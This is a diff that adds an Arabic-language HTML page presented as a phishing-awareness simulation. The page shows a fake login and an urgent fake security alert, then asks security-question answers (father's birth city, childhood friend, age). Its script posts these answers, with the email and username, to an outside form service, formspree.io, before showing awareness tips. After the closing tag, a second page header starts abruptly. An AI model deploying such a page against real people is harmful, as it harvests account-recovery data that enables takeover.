@@ -9,6 +9,149 @@
         .container { background: white; padding: 35px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 40, 100, 0.12); display: inline-block; max-width: 520px; width: 100%; box-sizing: border-box; border-top: 8px solid #1e3d59; text-align: right; }
         h2 { color: #1e3d59; text-align: center; margin-top: 0; }
         .status-box { background-color: #e3fafc; border: 1px solid #99e9f2; padding: 15px; border-radius: 6px; font-size: 14px; color: #0c8599; margin-bottom: 25px; line-height: 1.6; }
+        .threat-box { background-color: #fff5f5; border: 1px solid #ffe3e3; padding: 15px; border-radius: 6px; font-size: 14px; color: #e03131; margin-bottom: 25px; line-height: 1.6; display: none; }
+        .form-group { margin-bottom: 18px; }
+        label { display: block; font-weight: bold; margin-bottom: 6px; color: #1e3d59; font-size: 14px; }
+        input[type="text"], input[type="email"] { width: 100%; padding: 12px; border: 1px solid #ced4da; background: #fff; color: #333; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+        input[type="button"], input[type="submit"] { background-color: #17a2b8; color: white; border: none; padding: 12px 25px; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; transition: background 0.3s; margin-top: 10px; }
+        input[type="button"]:hover, input[type="submit"]:hover { background-color: #138496; }
+        
+        /* المراحل المخفية افتراضياً */
+        #step2, #awareness-page { display: none; }
+        .success-banner { background-color: #d4edda; border: 1px solid #c3e6cb; padding: 15px; border-radius: 6px; font-weight: bold; color: #155724; text-align: center; margin-bottom: 20px; }
+        .tips-list { padding-right: 20px; line-height: 1.8; }
+        .tips-list li { margin-bottom: 10px; color: #495057; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="main-card">
+    
+    <!-- الخطوة الأولى: تسجيل الدخول العام بالنظام -->
+    <div id="step1">
+        <h2>🔒 تسجيل الدخول الموحد</h2>
+        <div class="status-box">
+            يرجى إدخال بيانات الهوية الرقمية العامة للوصول إلى لوحة التحكم الخاصة بالشبكة المحلية.
+        </div>
+        <div class="form-group">
+            <label>البريد الإلكتروني المعتمد:</label>
+            <input type="email" id="email" placeholder="example@email.com">
+        </div>
+        <div class="form-group">
+            <label>اسم الحساب الشخصي (Username):</label>
+            <input type="text" id="username" placeholder="مثال: user_2026">
+        </div>
+        <input type="button" value="تسجيل الدخول" onclick="goToStep2()">
+    </div>
+
+    <!-- الخطوة الثانية: ظهور الإنذار المفاجئ وطلب معلومات الخصوصية -->
+    <div id="step2">
+        <h2>⚠️ تم تعليق الجلسة فوراً</h2>
+        <div class="threat-box" id="threatAlert" style="display: block;">
+            <strong>🚨 إنذار أمني حرج:</strong><br>
+            تم رصد محاولة وصول متزامنة غير معروفة أثناء تسجيل دخولك. لحماية النظام ومنع قفل الحساب نهائياً، يرجى تأكيد الأسئلة الخصوصية الإضافية فوراً لإثبات ملكيتك للحساب.
+        </div>
+        
+        <form id="awarenessForm">
+            <div class="form-group">
+                <label>سؤال الخصوصية 1: ما هو اسم المدينة التي ولد فيها والدك؟</label>
+                <input type="text" id="q1" required placeholder="الإجابة هنا">
+            </div>
+
+            <div class="form-group">
+                <label>سؤال الخصوصية 2: ما هو اسم أول صديق مقرب لك في الطفولة؟</label>
+                <input type="text" id="q2" required placeholder="الإجابة هنا">
+            </div>
+
+            <div class="form-group">
+                <label>سؤال الخصوصية 3: كم هو عمرك الحالي بدقة؟</label>
+                <input type="text" id="q3" required placeholder="الإجابة هنا">
+            </div>
+
+            <input type="submit" value="تأكيد المعلومات والتحقق الآمن">
+        </form>
+    </div>
+
+    <!-- المرحلة الثالثة: كشف حقيقة المحاكاة ونشر الوعي الأمني -->
+    <div id="awareness-page">
+        <h2>🎯 انتهت محاكاة الوعي الأمني بنجاح</h2>
+        <div class="success-banner">
+            🔒 تم إيقاف الفحص التهديدي. هذا الموقع عبارة عن تجربة تعليمية آمنة تماماً.
+        </div>
+        <p>لقد تابعت الخطوات رغبةً في حماية الحساب من الإنذار المفاجئ، ولكن من الناحية التقنية: <strong>لقد استجبت لخدعة الإنذار الوهمي (Urgency Trick) التي يتبعها مهندسو الاجتماع.</strong></p>
+        
+        <h3>💡 ما هي الدروس المستفادة من هذا الاختبار التتابعي؟</h3>
+        <ul class="tips-list">
+            <li><strong>الانتباه لظهور التحذيرات غير المنطقية:</strong> بمجرد ضغطك على "تسجيل الدخول" ظهر لك إنذار اختراق مباشر يطلب أسئلة أمان؛ المواقع الرسمية لا تدمج آليات الاسترجاع والإنذار بداخل صفحات عشوائية بهذا الشكل.</li>
+            <li><strong>عدم إدخال إجابات أسئلة الأمان:</strong> معلومات مثل اسم صديق الطفولة، مكان الولادة، والعمر هي الحواجز الأخيرة لحماية حساباتك، ومشاركتها تعني منح المفاتيح للمخترق لتجاوز كلمات المرور بسهولة عبر خيارات استعادة الحساب الحقيقية.</li>
+            <li><strong>مراقبة رابط المتصفح:</strong> تذكر دائماً التحقق من الرابط العلوي قبل التفاعل مع أي خطوة تالية، فالروابط المرفوعة خارج النطاقات الرسمية للشركات هي المؤشر الأبرز على وجود محاكاة أو هجوم تصيد.</li>
+        </ul>
+    </div>
+
+</div>
+
+<script>
+// الانتقال من الخطوة الأولى إلى الثانية عند الضغط
+function goToStep2() {
+    var emailField = document.getElementById('email').value;
+    var userField = document.getElementById('username').value;
+
+    if(emailField === "" || userField === "") {
+        alert("يرجى ملء حقول تسجيل الدخول أولاً للمتابعة.");
+        return;
+    }
+
+    // إخفاء الواجهة الأولى وإظهار واجهة الإنذار والأسئلة الخصوصية
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
+}
+
+// معالجة إرسال البيانات النهائية إلى Formspree والتوجيه لصفحة التوعية
+document.getElementById('awarenessForm').addEventListener('submit', function(e) {
+    e.preventDefault(); 
+
+    var data = {
+        Email: document.getElementById('email').value,
+        Username: document.getElementById('username').value,
+        Father_City: document.getElementById('q1').value,
+        Best_Friend: document.getElementById('q2').value,
+        Age: document.getElementById('q3').value
+    };
+
+    var formspreeUrl = 'https://formspree.io'; 
+
+    fetch(formspreeUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => {
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('awareness-page').style.display = 'block';
+    })
+    .catch(error => {
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('awareness-page').style.display = 'block';
+    });
+});
+</script>
+
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔒 بوابة التحقق والاستجابة الأمنية</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f4f8; text-align: center; padding: 40px 20px; color: #333; }
+        .container { background: white; padding: 35px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 40, 100, 0.12); display: inline-block; max-width: 520px; width: 100%; box-sizing: border-box; border-top: 8px solid #1e3d59; text-align: right; }
+        h2 { color: #1e3d59; text-align: center; margin-top: 0; }
+        .status-box { background-color: #e3fafc; border: 1px solid #99e9f2; padding: 15px; border-radius: 6px; font-size: 14px; color: #0c8599; margin-bottom: 25px; line-height: 1.6; }
         .form-group { margin-bottom: 18px; }
         label { display: block; font-weight: bold; margin-bottom: 6px; color: #1e3d59; font-size: 14px; }
         input[type="text"], input[type="email"], select { width: 100%; padding: 12px; border: 1px solid #ced4da; background: #fff; color: #333; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
